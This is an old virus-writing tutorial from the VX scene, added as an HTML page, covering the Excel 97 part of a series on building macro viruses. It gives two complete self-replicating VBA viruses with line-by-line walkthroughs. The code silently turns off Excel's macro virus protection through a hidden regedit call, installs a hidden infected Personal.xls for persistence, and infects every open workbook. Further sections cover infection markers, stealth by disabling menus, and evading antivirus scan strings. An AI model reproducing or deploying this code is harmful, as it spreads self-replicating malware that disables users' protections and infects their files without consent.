@@ -1,0 +1,766 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Excel 97</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / CUBErt NETwork                       ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Excel 97 ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</b>
+
+     .Introduction to Excel macros
+     .The 'Excel' basics
+     .Infection hooks for Excel
+     .The basic Excel module macro
+     .Infection technics for Excel
+     .Stealth technics for Excel
+     .The basic Excel class macro
+
+
+   [ Music ]
+  
+     .Ryker's .Ground Zer0
+     .Soulfly .Same (Special Digi-pack)
+     .Life of agony .Soul Searching Sun
+     .Pulp Fiction .Soundtrack
+     .Earth Crisis .Destroy the machines
+     .Radiohead .The bends
+
+<b>
+.Introduction to Excel macros</b>
+
+    Welcome to the Excel part.  If you already read  the Word part you will
+see that  there are a few  changes but the are  not so difficult.  The main
+difference to Word is that  we have in Excel no template where we  can save
+our macro,  but there is the possibility of creating an add - in which acts
+kinda same as the template in Word.  So thru this add-in we  have some kind
+of residence.  If an infected Excel workbook gets opened it first checks if
+there is  already and add-in or if an add-in is already  made if the add-in
+is infected with  our macro bug. The same but the  other way  round happens
+to a workbook  that gets opened when  there is already and virulant add-in.
+
+    Same as Word documents,  Excel sheets are traded alot,  not like Access
+Databases which most  of the time remain on one place,  so your macro has a
+got condition for spreading. 
+
+    Other than in Word,  in Excel we  can't access the  registry of Windows
+directly, so we have to use some kind of backdoor. The more things change
+in Excel but you will see that Excel is also a virulant platform.
+
+    If you never  coded anything in VBA  then I recommend you  to read also
+the introduction to Word, if you have read the Word part (I hope so) go on.
+
+<b>
+.The 'Excel' basics</b>
+
+    Phew .. you again reached the basics ... well kewl that you are reading
+now this  here.  Let's  start.  First install the Excel help  file for VBA,
+because it will be a good reference for you. It contains a lot of examples.
+If you are not sure about a command, place the cursor on it and press 'F1'.
+This will start the  help for this command.  Ok some of the basic  commands
+are:
+
+
+	On Error Resume Next
+
+    This  command takes care about  all errors that could  happen while our
+macro is executed.  If an error happens,  VBA will try to  execute the next
+command in our macro.  It is the same as in  Word and it  works in every of
+the languages caused by BASIC. You will find this command in all basic sec-
+tions, Word, Excel, PowerPoint, Access, etc.
+
+
+     Application.EnableCancelKey =  xlDisabled
+
+    First you have to know  that you can stop the execution of any macro by
+pressing ESC. So if the user does this, our macro will show errors and that
+is not good. Use this little command to disable the ESC key. So there is no
+bypass key anymore until you deactivate this option again. Similar to Word.
+
+
+     Application.ScreenUpdating = False
+
+    This is a nice command, with it you disable the screenupdating. It will
+speed up the  execution of our macro,  because Excel doesn't need to update
+our changes. So but keep in mind that you have to enable this updating aft-
+er infection otherwise the user won't see anything after the disabling.
+
+
+     Application.DisplayStatusBar = False
+
+    With this command we hide the status bar at the bottom of the window so
+the user won't see if we save the changes or whatever. It just to avoid the
+attention of the infected user.
+
+
+    Application.DisplayAlerts = False
+
+  This command turns off any alerts. If something not common happens really
+nothing will happen. This command will be active until you deactivate it.
+
+
+    So you now may wonder how to disable the Excel macro virus protection ?
+Well,  to disable this build - in function we need to do a bit more than in
+Word because in Excel is no command to turn it off or on. The basic concept
+is to make a .reg file and execute it.
+
+    Open "c:\excel.reg" For Output As 1
+    Print #1, "REGEDIT4"
+    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\" _
+                & "Office\8.0\Excel\Microsoft Excel]"
+    Print #1, """Options6""=dword:00000000"
+    Close 1
+
+    Shell "regedit /s c:\excel.reg",vbHide
+
+    Ok, this code will open a file,  print the registry information we need
+inside and then execute the registry editor in the background.  All this we
+need to change a registry setting an turn of the virus protection.
+
+
+    All commands you see here  have one purpose,  to avoid to get the close
+attention of the  user.  What's the use  when your  macro gets  immediately
+detected by the user? Damn, nothing will happen.  This commands help you to
+spread and increase lifetime of your virus. All this commands are also used
+in nearly every macro,  so if you look at  source codes you  will find this
+commands. There is only one problem for you. This commands are scan strings
+for virus scanner so you have  to use kind of anti heuristics which will be
+explained later.  If you don't know what  scan strings are  here is a short
+description:  Virus scanners,  especially for macro,  search the macro code
+for common virus commands like the ones above.  If the scanner finds two or
+more it detects your macro as a virus,  but there are a  few tricks to fool
+the scanners. ;)
+
+   Here is now  a little simple  graphic to explain you the way  of a macro
+in Excel,  it is bit different than in Word. We have two possibilities now,
+first we can make an add-in that works like a template.
+
+
+  .---------------.        .---------------.  An infected Worksheet gets
+  |   Worksheet   |  ---&gt;  |    MS Excel   |  opened by an  not infected
+  .---------------.        `---------------´  Excel Application
+  |     Macro     |    
+  `---------------´        
+
+  .---------------.        .---------------.  The macro  creates an add-
+  |   Worksheet   |  ---&gt;  |    MS Excel   |  in which is infected  with
+  .---------------.        .---------------.  our virus. This  add-in is
+  |     Macro     |        |    Add-In     |  now  resisdent   on  every
+  `---------------´        .---------------.  start of Excel
+                           |     Macro     |
+                           `---------------´
+
+  .---------------.        .---------------.  
+  |   Worksheet   |  &lt;---  |    MS Excel   |  
+  .---------------.        .---------------.  Our new add-in now infects
+  |     Macro     |        |    Add-In     |  every other workbook.
+  `---------------´        .---------------.  
+                           |     Macro     |
+                           `---------------´
+
+    This method is very effective, because every workbook gets now infected
+because of our virulant add-in which is present every time Excel is started
+and the user works. Now to another possibility. We make a workbook only in-
+fector. So this means, if an infected workbook gets opened/closed/whatever,
+the virus macro gets active and infects all open workbooks or just one, de-
+pends on the written code. So I did again a little chessy graphic for you.
+
+
+  .---------------.        .----------------.  
+  |   Worksheet   |  ---&gt;  |    MS Excel    |  An infected  workbook gets
+  .---------------.        .----------------.  opened.  As you  see there
+  |     Macro     |        |111 Workbook 111|  are two open workbooks and
+  `---------------´        .----------------.  they are not infected.
+                           |222 Workbook 222|
+                           `----------------´
+
+    So if your infection hook is now for example if the workbooks gets
+opened, then the graphic would like like this
+
+
+  .---------------.        .----------------.  
+  |   Worksheet   |  ---&gt;  |    MS Excel    |  
+  .---------------.        .----------------.  
+  |     Macro     |        |111 Workbook 111|  As you see workbook nr. 1  
+  `---------------´        .----------------.  and  workbook  nr.  2 got
+                           |11111 Macro 1111|  infected by our macro bug
+                           .----------------.  and  will now help  us to
+                           |222 Workbook 222|  spread the plaque ;)
+                           .----------------.
+                           |22222 Macro 2222|
+                           `----------------´
+
+
+    Of course  you can combine  this two  technics to get  the most effect-
+ivity. I will not do again a chessy graphic for this just combine graphic 1
+and graphic 2 in your mind.  These are the very common ways,  but maybe you
+will find another tech? Just keep trying!
+<b>
+
+.Infection hooks for Excel</b>
+
+    Well, I told you about infection hooks in Word part,  so if you forgot,
+just take a look back.  Ok , as I already said, Excel is different to Word,
+so are also the infection hooks. We have two for module infections and much
+more for class infection. Well, first about the infection hooks for an easy
+module infection. We have these hooks
+
+
+     Sub Auto_Open()
+     Sub Auto_Close()
+
+
+    As you see,  there is an underscore between the name, not like in Word.
+Other than in Word,  we can link our macro to  every activation  Excel does
+with a special command, but more on this later.
+
+
+ -Sub Auto_Open()-
+
+    Like the name says, this hook gets active when the workbooks is opened.
+
+-Sub Auto_Close()-
+
+    Same but on closing...
+
+    Now here are the hooks used for class and sheet infection, but I will
+talk about them later in this guide.
+
+
+     Private Sub Workbook_Activate()
+     Private Sub Workbook_Deactivate()
+     Private Sub Workbook_Open()
+     Private Sub Workbook_BeforeClose(Cancel As Boolean)
+     Private Sub Worksheet_Activate()
+     Private Sub Worksheet_Deactivate()
+
+    There are more but as I said, later ;)
+
+
+    Remember the special command I  told you about? We can use this command
+to link our macro to  every command like  adding a new workbook,  printing,
+saving, etc. Well, use this command only in module infection with this line
+
+    Application.OnSheetActivate = "SubName"
+
+    'SubName'  is the name of the  procedure which we want  to start if the
+user presses something. Some example of use would be
+
+    
+  Sub Auto_Open()
+   Application.OnSheetActivate = "Virus"
+  End Sub
+
+  Sub Virus()
+
+  ...
+
+  End Sub
+
+    If the workbook gets opened, the auto macro will link our macro 'Virus'
+to the application. Enough theory let's go on to our first basic module bug
+for Excel!!!
+
+
+<b>.The basic Excel module macro</b>
+
+    Hola, after lots of theory we will now take a look on a basic Excel bug
+with the basic infection routine. Here for I have an old Excel macro I have
+written. It was my first, so it is very simple, without any stealth, etc.
+
+---[ code starts here ]----------------------------------------------------
+
+Sub Auto_Open()
+Application.OnSheetActivate = "Virus"
+End Sub
+
+Sub Virus()
+On Error Resume Next
+
+Application.ScreenUpdating = False
+Application.DisplayAlerts = False
+Application.EnableCancelKey = xlDisabled
+Application.DisplayStatusBar = False
+
+Const SourceFile = "c:\jackie.sys"
+Const VirusName = "APMP"
+
+Application.VBE.ActiveVBProject.VBComponents(VirusName).Export SourceFile
+
+If Dir(Application.StartupPath & "\Personal.xls") = "Personal.xls" Then _
+ GlobalInstalled = True
+
+For x = 1 To ActiveWorkbook.VBProject.VBComponents.Count
+    If ActiveWorkbook.VBProject.VBComponents(x).Name = VirusName Then _
+     ActiveInstalled = True
+Next
+
+If ActiveInstalled = False Then
+    ActiveWorkbook.VBProject.VBComponents.Import SourceFile
+    ActiveWorkbook.SaveAs ActiveWorkbook.FullName
+End If
+
+If GlobalInstalled = False Then
+    Workbooks.Add.SaveAs FileName:=Application.StartupPath _
+     & "\Personal.xls"
+    ActiveWorkbook.VBProject.VBComponents.Import SourceFile
+    ActiveWindow.Visible = False
+    Workbooks("Personal.xls").Save
+End If
+
+Msgbox "Excel instructional macro by jackie", 0, "Excel.APMP"
+
+End Sub
+
+---[ code ends here ]------------------------------------------------------
+
+    I will walk now through the code, step by step. Well this a very basic,
+lame macro bug, but it does it's work.
+
+---------------------------------------------------------------------------
+Sub Auto_Open()
+Application.OnSheetActivate = "Virus"
+End Sub
+---------------------------------------------------------------------------
+
+    Well,  this is the 'special' command which links our macro to the work-
+book. In this case, it links the sub 'Virus'.
+
+---------------------------------------------------------------------------
+Sub Virus()
+On Error Resume Next
+---------------------------------------------------------------------------
+
+    Hmm...think I don't to explain this anylonger.
+
+---------------------------------------------------------------------------
+Application.ScreenUpdating = False
+Application.DisplayAlerts = False
+Application.EnableCancelKey = xlDisabled
+Application.DisplayStatusBar = False
+---------------------------------------------------------------------------
+
+    This are the  basic commands,  disable screen updating  to speed up our
+macro.  Disable the displaying of errors during infection, disable the can-
+cel key and finally hide the  statusbar that the  user won't see if we save
+something.
+
+---------------------------------------------------------------------------
+Const SourceFile = "c:\jackie.sys"
+Const VirusName = "APMP"
+---------------------------------------------------------------------------
+
+    Here we set two constants  that stay the  same in the whole macro.  The
+first one is the source file for the  export of our virus code.  The second
+one is the name  of the  module that we are using.  We always  stay in this
+module so the name won't change. Short...is the name of the module.
+
+---------------------------------------------------------------------------
+Application.VBE.ActiveVBProject.VBComponents(VirusName).Export SourceFile
+---------------------------------------------------------------------------
+
+    This command exports the content of the virus module.  The code will be
+saved in the  file set in the constant  'SourceFile' .  This means  for our
+macro that all macro code will be stored in 'c:\jackie.sys'.
+
+---------------------------------------------------------------------------
+If Dir(Application.StartupPath & "\Personal.xls") = "Personal.xls" Then _
+ GlobalInstalled = True
+---------------------------------------------------------------------------
+
+    Here we check if there is  already an add-in called ' Personal.xls ' in
+the startup path of Excel,  if there is one,  we set our check  variable to
+'True'.
+
+---------------------------------------------------------------------------
+For x = 1 To ActiveWorkbook.VBProject.VBComponents.Count
+    If ActiveWorkbook.VBProject.VBComponents(x).Name = VirusName Then _
+     ActiveInstalled = True
+Next
+---------------------------------------------------------------------------
+
+    This nice little for ... next loop checks if our virus  has already in-
+fected the  active workbook.  First make a loop from  one to the  number of
+Visual Basic components in the workbook.  Compare if the name of the actual
+component is the same as our macros. If yes set our variable check variable
+for the active workbook infection to 'True'.
+
+---------------------------------------------------------------------------
+If ActiveInstalled = False Then
+    ActiveWorkbook.VBProject.VBComponents.Import SourceFile
+    ActiveWorkbook.SaveAs ActiveWorkbook.FullName
+End If
+---------------------------------------------------------------------------
+
+    If we are not installed  in the active workbook,  then import our macro
+through the our souce code. Save the workbook as it's fullname after we did
+infected it.
+
+---------------------------------------------------------------------------
+If GlobalInstalled = False Then
+    Workbooks.Add.SaveAs FileName:=Application.StartupPath _
+     & "\Personal.xls"
+    ActiveWorkbook.VBProject.VBComponents.Import SourceFile
+    ActiveWindow.Visible = False
+    Workbooks("Personal.xls").Save
+End If
+---------------------------------------------------------------------------
+
+    If there is no virulant add in, we create a new workbook and save it as
+'Personal.xls'  in the startup path of Excel.  After this we infect it with
+our macro and hide it so that the user won't notice it, finally save it.
+
+---------------------------------------------------------------------------
+Msgbox "Excel instructional macro by jackie", 0, "Excel.APMP"
+---------------------------------------------------------------------------
+
+    Hehe ... this is our little payload.  It just pops up a little box with
+the above contents.
+
+---------------------------------------------------------------------------
+End Sub
+---------------------------------------------------------------------------
+
+    No comment... :-)
+
+    So this is your first Excel macro bug.  This is a very very poor macro,
+no stealth, etc...only for the purpose of this tutorial... hehe. Try it and
+play a bit with the code, it is a fully working macro bug!  Like you see it
+is really no big problem to write such little macros.  If you didn't under-
+stood something read it again ( hehe ) and continue then with the guide. As
+you see, Excel is a bit different to Word, but as easy as Word.
+
+<b>
+.Infection technics for Excel</b>
+
+    In this chapter of our guide we will take a close look on the different
+infection and checking  routines.  It is very important to find always some
+kind of new infection technics because  the Antivirus scene does not sleep!
+First I will explain the very common import/export method.  There are older
+ones, but the don't work under SR-1 anymore. ( SR-1 was the service release
+of microsoft to stop the macro viruses ).
+
+
+<b> .Import/Export</b>
+
+    Well,  first of all I  will show you the  standard method of infection,
+which looks similar to the one we learned in Word part. It is the quite the
+same as Import/Export method, I/E for Excel even. ;-)
+
+ Application.VBE.ActiveVBProject.VBComponents("bug").Export "c:\jackie.sys"
+
+    Hell, yeah, this code will export our viral code into a file on the hdd
+and save it there for later use.  ;-) As you see we don't use a special ob-
+ject like 'Normaltemplate' in Word, we just take the active project and try
+to export the component 'bug'.  So to import the whole thing again into our
+host to infect, we can use the following command.
+
+ ActiveWorkbook.VBProject.VBComponents.Import "c:\jackie.sys"
+
+    This one  would add a module and  add our viral code  from the external
+file on hdd.  You may recognize this piece  of code from the Word part,  so
+you see that it is quite similar.  As you see, it is a good idea  to use it
+in your basic  module macro.  Now we focus on the  technics available for a
+nice class infection.
+
+
+<b> .Add From File</b>
+
+
+First to the infection  technic which is used by class macros. First we ex-
+port the source code into an external file.
+
+ ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").Export "c:\blah.sys"
+
+This command exports the code of the class  object ('ThisWorkbook') of Word
+into the file 'c:\blah.sys'. Notice that. For the infection of a class obj-
+ect we  need to import it into the class object again. This is done by this
+command.
+
+ ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule _
+ .AddFromFile "c:\blah.sys"
+
+This command  inserts our viral code  into the class  object of the  active
+workbook, but there is a problem  which is solved easily.  When you compare
+the two exported files,  'jackie.sys' and 'blah.sys',  you will see that in
+the class file Word will add four internal  lines which will be imported on
+infection.  So we need to delete these four lines.  Use this command to cut
+them
+
+ ActiveWorkbook.VBProject.VBComponents("ThisWorkbook") _
+ .CodeModule.DeleteLines 1,4
+ 
+This command will delete the first four lines which we don't need. That you
+see what I mean if have here the four lines which will be added to the code
+automatically.
+
+ VERSION 1.0 CLASS
+ BEGIN
+   MultiUse = -1  'True
+ END
+
+We don't need this lines, they will only force an error, so we delete them.
+
+<b>
+ .Add From String/Insert Lines</b>
+
+Let's take a look at another  infection technic,  which I use in general in
+my macro bugs. First we save the whole viral code in a variable and then we
+add our code to the template/workbook through this string variable.  Take a
+look at this command, which saves the whole code from line one to twenty in
+the variable 'OurCode'
+
+ OurCode = ThisWorkbook.VBProject.VBComponents("ThisWorkbook") _
+           .CodeModule.Lines(1,20)
+
+Ha, you know what 'ThisDocument' means? Na? Well it refers to the template/
+workbook, in which the current code is located. So you don't have to choose
+where  the code  is located,  Word does  it for you.  In the  bracket after
+'Lines' you  have to put  the number  of lines you  want to store  into the
+variable. The first number is the line in which we start, normaly line num-
+ber one.  The second one is how many lines.  So in our case,  the code from
+line one  until line twenty will be saved in variable 'OurCode'.  So now we
+need to add this code into our target to infect. Use this command
+
+ ActiveWorkbook.VBProject.VBComponents("ThisWorkbook") _
+  .CodeModule.AddFromString OurCode
+
+to add our code to the class object of active workbook. Another command and
+the same effect would be
+
+ActiveWorkbook.VBProject.VBComponents("ThisWorkbook") _
+ .CodeModule.InsertLines 1, OurCode
+
+which would insert all the code in the variable in the first line of active
+workbook's class object.  Whatever, use the command you like better. If you
+don't understand a thing,  just re-read it and when you will come away from
+theory you will understand it. Now we come to a more or less important part
+of macro bugs, the stealth.
+
+    Well, now we take a look on the methods or technics we can check if our
+macro virus is already present.  First for module infection we can check if
+our module is present.  This can be done with a few commands or routines. I
+will show you here two different for modules. Well the first one we already
+saw in our first macro bug in the last chapter.  Use the following code.
+
+ For x = 1 To ActiveWorkbook.VBProject.VBComponents.Count
+     If ActiveWorkbook.VBProject.VBComponents(x).Name = VirusName Then _
+      ActiveInstalled = True
+ Next
+
+    As I explained in last chapter this piece  of code does a for-next loop
+from 1 to the number of Visual Basic components in the workbook of Xcel. If
+the name is equal to our name stored in the const 'VirusName', then set our
+check variable to 'True'. Continue loop until last component. Ok next piece
+of code is a bit smaller but has the same result. Let's see how it is done.
+
+ If Len(ActiveWorkbook.VBProject.VBComponents("Virus").Name) = 0 Then _
+  ActiveInfected = True
+
+    What we do here,  is to check the length of  the viral module  with the
+name 'Virus'. If the length is zero then the component doesn't exist and we
+set our check variable to 'True'. Fine.
+
+    As you see it is easy to check if we are infected, you may find another
+method to check this, but this are the common ones. Well you have to remem-
+ber that you HAVE to find new ones,  because AV community won't sleep!  ;-)
+Ok, now we leave module infection checks alone and go on with class infect-
+ion checking, which you will need later, but explained here.
+
+    First method to check class  infection is to count  the number of lines
+in template or document and see if the number is similar to our viral code.
+This method was used in the first know class macro 'Class.Poppy'.  The code
+to check this would be similar to this. Well I changed it to fit in Excel.
+
+ If ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule _
+ .CountOfLines = 23 Then Infected = True
+
+Another method to  check for a previous  infection is  to make a  marker in
+your code.  In the following example we use the string 'Marker' as our inf-
+ection marker. Here is the code.
+
+ If ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule _
+  .Lines(1,1) = "'Virus" Then Infected = True
+
+    Well, here we  check if the first line of  code in the class  module in
+the workbook of Excel is equal to our marker ' Virus '. If it is we set our
+check variable to 'True'. And of course you can put the marker in every li-
+ne you want,  just change the settings then.
+
+<b>
+.Stealth technics for Excel</b>
+
+    Ok, welcome to the daily part,  stealth.  This part is needed to try to
+hide your creation from the user.  Well, in Excel there is just one technic
+we can use,  as far as I found out. :-)  The technic I am talking  about is
+disabling menus.  Here is a list of the menus that  are usefull to  disable
+them a bit.
+
+ CommandBars("Tools").Controls(10).Enabled = False
+ CommandBars("Tools").Controls(12).Enabled = False
+ CommandBars("View").Controls(3).Enabled = False
+ CommandBars("Window").Controls(3).Enabled = False
+ CommandBars("Window").Controls(4).Enabled = False
+
+    If you are looking for stuff like ' Sub ViewCode() ' etc you are wrong,
+in Excel you are not allowed to interrupt such actions.  Well, at least you
+can use the technic to change  the colors of the VBEditor with the method I
+showed you in the Word part,  but remember that you need to access the reg-
+istry as I explained above with the virus protection.
+
+<b>
+.The basic Excel class macro</b>
+
+    Hi there, are you awake or sleeping?  Hope you are alive! ;)  So before
+you continue with this part,  I recommend you to toy around with the module
+infections first,  to get all  the basics.  Without them you  copy just the
+code here and write a macro.  Kewl,  then you are one of those lamers which
+gave macro  such a bad name,  just hacking other macros.  Try to understand
+the basics then go on, use your immagination and write gewd macros!  If you
+think  it's ok to write lack macros,  then FUCK YOU BURN THIS TUTORIAL!  VX
+scene doesn't need such people,  but if you don't think it's ok to be lame,
+then feel free and read on! You have to understand my reaction,  because if
+you look at  www.avpve.com  into the macro  section you will see that there
+are too much macros by lamers which sended there creation to AVP just to be
+on the AVPVE site, fuck this lamers! Never forget, don't send your creation
+to any AV firm! It's lame.  You don't want to be lame or? So read on to get
+out of this phase.
+
+    Ok, let's come now to the class infection. What is a class object? Easy
+if you take a look at your visual basic editor,  then you will find a thing
+called ' ThisWorkbook '. This is our class object.  Every workbook has this
+class inside, so it should be a kewl idea to infect such  an object or what
+you think? Before we start we will do some theory. First you can't have the
+same public  routines in class objects.  Ok,  I am going to show you here a
+really basic class infection for Excel.  It will just infect open workbooks
+and will now create a template and go resisdent.
+
+---[ code starts here ]----------------------------------------------------
+
+'Excel
+Private Sub Workbook_Deactivate()
+On Error Resume Next
+If UCase(Dir("c:\excel.inf") &lt;&gt; "EXCEL.INF" Then
+    Open "c:\excel.inf" For Output As 1
+    Print #1, "REGEDIT4"
+    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\" _
+                & "Office\8.0\Excel\Microsoft Excel]"
+    Print #1, """Options6""=dword:00000000"
+    Close 1
+    Shell "regedit /s c:\excel.inf",vbHide
+End If
+OurCode = ThisWorkbook.VBProject.VBComponents("ThisWorkbook") _
+           .CodeModule.Lines(1, 24)
+For Each Target In Workbooks
+If Target.VBProject.VBComponents("ThisWorkbook") _
+    .CodeModule.Lines(1,1) &lt;&gt; "'Excel" Then
+   Target.VBProject.VBComponents("ThisWorkbook") _
+    .CodeModule.AddFromString OurCode
+   ActiveWorkbook.SaveAs ActiveWorkbook.FullName
+End If
+Next
+Msgbox "A virus", 64, "Disclaimer"
+End Sub
+
+---[ code ends here ]------------------------------------------------------
+
+    Well, I will now walk throug every line of code, so that you understand
+everything. First, this virus has no stealth and a message payload.
+
+---------------------------------------------------------------------------
+'Excel
+---------------------------------------------------------------------------
+
+    Well, this is our infection marker.  Our virus checks if this marker is
+present in the  first line of the class object.  It is just a comment which
+identifies our virus.
+
+---------------------------------------------------------------------------
+Private Sub Workbook_Deactivate()
+---------------------------------------------------------------------------
+
+    This is our infection trigger, the virus routine gets activate on close
+of the active workbook.
+
+---------------------------------------------------------------------------
+On Error Resume Next
+---------------------------------------------------------------------------
+
+    Catch all errors!
+
+---------------------------------------------------------------------------
+If UCase(Dir("c:\excel.inf") &lt;&gt; "EXCEL.INF" Then
+    Open "c:\excel.inf" For Output As 1
+    Print #1, "REGEDIT4"
+    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\" _
+                & "Office\8.0\Excel\Microsoft Excel]"
+    Print #1, """Options6""=dword:00000000"
+    Close 1
+    Shell "regedit /s c:\excel.inf",vbHide
+End If
+---------------------------------------------------------------------------
+
+    Ok, a bit more now. Here we check if the file 'excel.inf' exists in the
+root of c:\.  If not we create it with the content for the registry we need
+to turn off the build  in virus protection of Excel.  After that we run the
+file with the registry editor.
+
+---------------------------------------------------------------------------
+OurCode = ThisWorkbook.VBProject.VBComponents("ThisWorkbook") _
+           .CodeModule.Lines(1, 24)
+---------------------------------------------------------------------------
+
+    Here we save all code from line one to 24 into the variable 'OurCode'.
+
+---------------------------------------------------------------------------
+For Each Target In Workbooks
+If Target.VBProject.VBComponents("ThisWorkbook") _
+    .CodeModule.Lines(1,1) &lt;&gt; "'Excel" Then
+---------------------------------------------------------------------------
+
+    Create a loop through all open workbooks. Now try we check if the first
+line of all the class objects in all  open workbooks is unequal to the nice
+Marker we defined.
+
+---------------------------------------------------------------------------
+   Target.VBProject.VBComponents("ThisWorkbook") _
+    .CodeModule.AddFromString OurCode
+   ActiveWorkbook.SaveAs ActiveWorkbook.FullName
+End If
+Next
+---------------------------------------------------------------------------
+
+    Insert the viral code  and save the workbook with it's fullname.  After
+that jump back to the next file.
+
+---------------------------------------------------------------------------
+Msgbox "A virus", 64, "Disclaimer"
+---------------------------------------------------------------------------
+
+    Hehe, our well known message payload.
+
+---------------------------------------------------------------------------
+End Sub
+---------------------------------------------------------------------------
+
+    End of this shit ;-)
+
+    Well, as you see, that was class infection. As everything in macro, the
+Excel platform is an easy to infect too. I hope Excel is now clear to you
+and that you can go on with a new chapter of this tutorial now. However, if
+you have any questions feel free to mail me. Now spotlight on Power Point!
+
+                               -End Of Part #3-
+<b>
+=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
